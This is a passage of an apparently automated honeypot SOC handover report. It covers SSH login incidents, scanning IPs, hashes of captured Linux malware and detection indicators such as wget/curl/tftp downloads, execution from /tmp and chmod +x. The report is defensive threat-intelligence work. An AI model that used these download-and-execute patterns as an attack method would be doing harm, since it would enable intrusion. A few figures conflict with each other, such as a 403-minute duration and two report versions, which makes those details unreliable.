- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cca10db6aeb

| Field | Detail |
|---|---|
| **Source IP** | `177.174.0[.]3` |
| **First Seen** | 2026-08-19 18:54 |
| **Last Seen** | 2026-08-19 18:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:54:04` | `cowrie.session.connect` |
| `2026-08-19 18:54:05` | `cowrie.client.version` |
| `2026-08-19 18:54:05` | `cowrie.client.kex` |
| `2026-08-19 18:54:07` | `cowrie.login.success` |
| `2026-08-19 18:54:08` | `cowrie.direct-tcpip.request` |
| `2026-08-19 18:54:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.0[.]3` to AbuseIPDB if not already reported
- [ ] Block `177.174.0[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `80.251.153[.]178` | **341** | 2026-08-19 16:55 | 2026-08-19 18:54 | 403m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-08-19 17:02 | 2026-08-19 18:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `71.6.146[.]130` | **4** | 2026-08-19 17:17 | 2026-08-19 17:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `180.76.235[.]175` | **3** | 2026-08-19 18:11 | 2026-08-19 18:43 | 6m | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | **3** | 2026-08-19 17:22 | 2026-08-19 17:32 | 1m | 0 | `T1592` | 🟢 LOW |
| `136.119.118[.]84` | **2** | 2026-08-19 18:38 | 2026-08-19 18:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `176.32.193[.]16` | **2** | 2026-08-19 18:25 | 2026-08-19 18:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | **2** | 2026-08-19 17:06 | 2026-08-19 17:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.64.104[.]177` | **2** | 2026-08-19 17:55 | 2026-08-19 17:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.25.76[.]66` | 1 | 2026-08-19 18:17 | 2026-08-19 18:17 | 12s | 0 | `T1592` | 🟢 LOW |
| `111.39.206[.]23` | 1 | 2026-08-19 17:30 | 2026-08-19 17:30 | 4s | 0 | `T1592` | 🟢 LOW |
| `120.26.202[.]34` | 1 | 2026-08-19 18:29 | 2026-08-19 18:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.10.203[.]54` | 1 | 2026-08-19 18:19 | 2026-08-19 18:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `176.170.1[.]244` | 1 | 2026-08-19 17:47 | 2026-08-19 17:47 | 5s | 0 | `T1592` | 🟢 LOW |
| `178.178.222[.]61` | 1 | 2026-08-19 18:54 | 2026-08-19 18:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `181.45.177[.]67` | 1 | 2026-08-19 16:59 | 2026-08-19 16:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]168` | 1 | 2026-08-19 17:52 | 2026-08-19 17:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.189.139[.]52` | 1 | 2026-08-19 18:28 | 2026-08-19 18:28 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-08-19 18:43 | 2026-08-19 18:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.91.64[.]6` | 1 | 2026-08-19 18:24 | 2026-08-19 18:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.210.7[.]34` | 1 | 2026-08-19 18:12 | 2026-08-19 18:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `61.6.206[.]13` | 1 | 2026-08-19 18:03 | 2026-08-19 18:03 | 2s | 0 | `T1592` | 🟢 LOW |
| `65.20.191[.]231` | 1 | 2026-08-19 17:40 | 2026-08-19 17:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `95.138.69[.]172` | 1 | 2026-08-19 18:32 | 2026-08-19 18:32 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `213.234.9[.]218` | RU | OAO Bank Petrokommerc | **100** ⚠️ | 50 |
| `61.6.206[.]13` | BN | Unified National Networks | **100** ⚠️ | 50 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `176.32.193[.]16` | AM | Ucom CJSC | **100** ⚠️ | 50 |
| `62.182.132[.]94` | RU | Net By Net Holding LLC | **100** ⚠️ | 50 |
| `91.233.83[.]203` | GB | Andrew Millar Ltd | **100** ⚠️ | 10 |
| `178.178.194[.]135` | RU | Metropolitan branch of PJSC MegaFon | **100** ⚠️ | 50 |
| `45.33.109[.]18` | US | Linode | **100** ⚠️ | 50 |
| `103.25.76[.]66` | MM | Global Technology Co., Ltd. | **100** ⚠️ | 0 |
| `139.199.80[.]137` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 77 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 67 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |

---

## 🔕 False Positive Summary (18 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 15 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 464 cases |
| Tool 34  | Credential Extractor        | ✅ 85 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 70 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 18 filtered (3.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 60 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 20 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 67 priority case(s) shown individually · 24 recon entry/entries in table (9 group(s) consolidating 364 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-19T20:33:47Z_
